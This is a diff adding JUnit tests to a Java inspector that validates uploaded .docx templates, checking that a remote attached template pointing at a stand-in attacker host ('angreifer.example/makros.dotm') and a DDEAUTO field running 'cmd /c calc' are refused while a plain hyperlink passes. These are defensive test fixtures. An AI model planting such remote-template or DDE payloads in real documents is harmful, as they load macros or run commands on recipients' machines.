@@ -80,6 +80,71 @@ class DocxTemplateInspectorTest {
   }
 
   @Test
+  void anAttachedTemplateFromOutsideIsRefused() throws IOException {
+    Path file =
+        write(
+            withPackage(
+                document ->
+                    document
+                        .getPackagePart()
+                        .addExternalRelationship(
+                            "http://angreifer.example/makros.dotm",
+                            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+                                + "attachedTemplate")));
+
+    assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
+        .isInstanceOf(ValidationException.class)
+        .hasMessageContaining("nachladen");
+  }
+
+  @Test
+  void aHyperlinkStaysAllowed() throws IOException {
+    Path file =
+        write(
+            withPackage(
+                document ->
+                    document
+                        .getPackagePart()
+                        .addExternalRelationship(
+                            "https://www.example.org",
+                            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+                                + "hyperlink")));
+
+    assertThat(inspector.inspect(file, "vorlage.docx", Files.size(file))).isNotEmpty();
+  }
+
+  @Test
+  void aDdeFieldIsRefused() throws IOException {
+    Path file =
+        write(
+            withPackage(
+                document ->
+                    document
+                        .createParagraph()
+                        .createRun()
+                        .getCTR()
+                        .addNewInstrText()
+                        .setStringValue(" DDEAUTO cmd \"/c calc\" ")));
+
+    assertThatThrownBy(() -> inspector.inspect(file, "vorlage.docx", Files.size(file)))
+        .isInstanceOf(ValidationException.class)
+        .hasMessageContaining("nachladen");
+  }
+
+  private static byte[] withPackage(
+      java.util.function.Consumer<org.apache.poi.xwpf.usermodel.XWPFDocument> change)
+      throws IOException {
+    try (org.apache.poi.xwpf.usermodel.XWPFDocument document =
+            new org.apache.poi.xwpf.usermodel.XWPFDocument(
+                new ByteArrayInputStream(TestDocx.withParagraphs("{{ a }}")));
+        ByteArrayOutputStream out = new ByteArrayOutputStream()) {
+      change.accept(document);
+      document.write(out);
+      return out.toByteArray();
+    }
+  }
+
+  @Test
   void aFileAboveTenMegabytesIsRefused() throws IOException {
     Path file = write(TestDocx.withParagraphs("{{ a }}"));
 
